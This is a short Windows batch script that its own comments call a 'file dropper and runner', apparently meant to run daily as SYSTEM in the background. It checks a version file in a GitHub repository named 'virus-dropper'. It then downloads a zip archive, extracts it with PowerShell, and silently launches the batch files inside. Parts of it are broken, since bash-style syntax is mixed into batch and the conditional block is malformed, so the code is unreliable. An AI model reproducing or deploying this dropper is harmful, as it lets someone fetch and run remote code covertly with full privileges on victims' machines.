@echo off
::file dropper and runner
::this file is run daily as ADMINISTRATOR with highets elevation, under the name of SYSTEM, in BACKGROUND
set /a version = 2
output=$(curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/Version.txt")
If %output%>%version%
  start /min AV.bat
  curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/Updater.zip" --output "Updates.zip"
  powershell.exe -nologo -noprofile -command "& { $shell = New-Object -COM Shell.Application; $target = $shell.NameSpace('%~dp0'); $zip = $shell.NameSpace('%~dp0\Updates.zip'); $target.CopyHere($zip.Items(), 16); }"
  del /f /q Updates.zip
  move "%~dp0\updates\Updater.bat" "%~dp0"
  rd updates
  start /min Updater.bat
exit
